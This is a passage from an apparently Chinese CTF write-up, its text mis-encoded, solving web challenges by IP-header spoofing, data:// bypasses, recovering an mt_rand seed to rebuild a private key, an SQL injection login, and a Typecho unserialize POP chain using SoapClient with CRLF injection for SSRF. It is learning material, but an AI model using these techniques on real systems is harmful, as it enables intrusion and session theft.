<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$ipæ˜¯é€šè¿‡getIp()è·å–IPä½†å…·ä½“ä¸çŸ¥é“é€šè¿‡ä»€ä¹ˆåˆ¤æ–­çš„åªèƒ½çŒœäº†</p>
<p>1.Client-IP</p>
<p>2.X-Forwarded-For</p>
<p>3.X-Real-IP</p>
<p>å¯¹äºfile_get_contentså¯ä»¥åˆ©ç”¨<code>data://</code>ä¼ªåè®®ç»•è¿‡æˆ–è€…<code>php://input</code> ç»•è¿‡</p>
<p><code>change</code>æ”¹å˜äº†æˆ‘ä»¬ä¼ å…¥çš„fileå‚æ•°ï¼Œæ‰€ä»¥ä¼ å…¥å‰å…ˆåŠ å¯†file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechage</span><span class="params">($v)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(unchage($a));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411223358460.png" alt="image-20200411223358460"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328233109846.png" alt="image-20200328233109846"></p>
<h3 id="6-Ezaudit"><a href="#6-Ezaudit" class="headerlink" title="6.Ezaudit"></a>6.Ezaudit</h3><p>ç›´æ¥æ‰«ç›®å½•ï¼Œå‘ç°æºç </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411225633366.png" alt="image-20200411225633366"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦æ˜¯è¦æ¯”è¾ƒè¿™ä¸ªç§é’¥ï¼Œé¢˜ç›®ç»™äº†å…¬é’¥ï¼Œå¯ä»¥å‘ç°ä»–ä»¬éƒ½æ˜¯<code>mt_rand()</code>ç”Ÿæˆçš„ã€‚æ‰€ä»¥åªè¦ç”¨å…¬é’¥å»è¿˜åŸç§å­ï¼Œç„¶åå†æ‰‹å·¥ç®—å‡ºç§é’¥å³å¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>ç”¨php_mt_seedè·‘å‡ºç§å­ä¸º <code>1775196155</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411232419172.png" alt="image-20200411232419172"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key = public_key();</span><br><span class="line">$private_key = private_key();</span><br><span class="line"><span class="keyword">echo</span> $Public_key . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $private_key;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç§é’¥ <code>XuNhoueCDCGc</code>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯phpç‰ˆæœ¬å¤§ç‰ˆæœ¬è¦å’Œé¢˜ç›®ç¯å¢ƒç›¸åŒï¼Œä¸ç„¶å¾—å‡ºçš„ç§é’¥æ˜¯ä¸ä¸€æ ·çš„</p>
<p>æœ€åé€šè¿‡ä¸‡èƒ½å¯†ç æ‹¿åˆ°flag</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411233744024.png" alt="image-20200411233744024"></p>
<h3 id="7-Ezpop-Revenge"><a href="#7-Ezpop-Revenge" class="headerlink" title="7.Ezpop_Revenge"></a>7.Ezpop_Revenge</h3><p>æ²¡å†™å‡ºæ¥ï¼Œå¤ç°å­¦ä¹ ä¸€ä¸‹</p>
<p>è¿˜æ˜¯<code>www.zip</code>æºç æ³„éœ²</p>
<p>flag.phpæš—ç¤ºåº”è¯¥è¦SSRF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"æˆ‘æ‰Œyour problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ‰¾ååºåˆ—çš„ä½ç½®</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412124013730.png" alt="image-20200412124013730"></p>
<p><code>Plugin.php</code>ä¸­å…³é”®çš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">truetruetrue<span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">truetruetruetrueunserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">truetruetrue<span class="keyword">else</span> &#123;</span><br><span class="line">truetruetruetrue<span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ä¼šè§¦å‘ <code>__wakeup()</code> å¹¶å®ä¾‹åŒ– <code>Typecho_Db</code>ç±»ï¼Œè·Ÿè¿›<code>/var/Typecho/Db.php</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412131913212.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæç¤ºäº† <code>__toString()</code> æ–¹æ³•ï¼Œæ¥ç€æœ</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412141521405.png" alt="image-20200412141521405"></p>
<p>åœ¨ <code>/var/Typecho/Db/Query.php</code> ä¸­<code>__toString</code>å¯è¢«åˆ©ç”¨ </p>
<p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** æ•°æ®åº“å…³é”®å­— */</span></span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Typecho_Db_Adapter $adapter, $prefix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = &amp;$adapter;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = <span class="keyword">self</span>::$_default;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºSELECTï¼Œåœ¨<code>__toString()</code>æ–¹æ³•å†…å°±ä¼šè¿”å›<code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code>ï¼Œè°ƒç”¨äº†<code>$this-&gt;_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚</p>
<p><strong>POPé“¾é€»è¾‘ï¼š</strong></p>
<ul>
<li>ååºåˆ—åŒ–<code>HelloWorld_DB</code>ï¼Œå°±è§¦å‘äº†<code>__wakeup()</code>æ–¹æ³•ï¼Œåœ¨<code>__wakeup()</code>å†…å®ä¾‹åŒ–<code>Typecho_Db</code>å¹¶ä»¥<code>$this-&gt;coincidence[&#39;hello&#39;]</code>ä½œä¸º<code>Typecho_Db</code>çš„<code>__construct()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›</li>
<li>PHPçš„æ•°ç»„æ˜¯å¯ä»¥å­˜å¯¹è±¡ï¼Œå‡è®¾<code>$this-&gt;coincidence[&#39;hello&#39;]</code>å®ä¾‹åŒ–<code>Typecho_Db_Query</code>å¯¹è±¡ï¼Œåœ¨<code>Typecho_Db</code>çš„æ„é€ æ–¹æ³•ä¸­å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²ï¼Œå°±è§¦å‘äº†<code>Typecho_Db_Query</code>çš„<code>__toString()</code>æ–¹æ³•ï¼›</li>
<li>åœ¨<code>__toString()</code>å†…ï¼Œå¦‚æœ<code>$_sqlPreBuild[&#39;action&#39;]</code>ä¸º<code>&#39;SELECT&#39;</code>å°±ä¼šè§¦å‘<code>$_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ï¼›</li>
<li>å°†<code>$_adapter</code>å®ä¾‹åŒ–ä¸º<code>SoapClient</code>ï¼Œè°ƒç”¨<code>parseSelect()</code>æ˜¯ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘äº†<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•</li>
<li><code>__call()</code>æ˜¯å®ç°SSRFçš„å…³é”®</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient::__call ( string $function_name , <span class="keyword">array</span> $arguments )</span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ‰¾æ’ä»¶åœ¨å“ªé‡Œè°ƒç”¨äº†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412151046867.png" alt="image-20200412151046867"></p>
<p><code>/var/Typecho/Plugin.php</code>ä¸­æœ‰æ¡è·¯ç”±</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412195650568.png" alt="image-20200412195650568"></p>
<p>è®¿é—® <code>/page_admin</code>å³å¯å¯ç”¨æ’ä»¶</p>
<p>æƒ³è¦å¸¦SESSIONå‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„PHPSESSIDä¼ è¿‡å»ï¼Œç„¶è€ŒSOAPå¹¶ä¸èƒ½è®¾ç½®Cookieï¼Œå› æ­¤éœ€è¦CRLFã€‚SoapClientå¯ä»¥è®¾ç½®UAï¼Œåªè¦åœ¨UAååŠ ä¸Š<code>\r\nCookie: PHPSESSID=xxx</code>å°±èƒ½ä¸ºhttpå¤´æ·»åŠ ä¸€ä¸ªæ–°çš„Cookieå­—æ®µï¼Œè¿™æ ·å°±èƒ½å¸¦ä¸Šsessionäº†ã€‚</p>
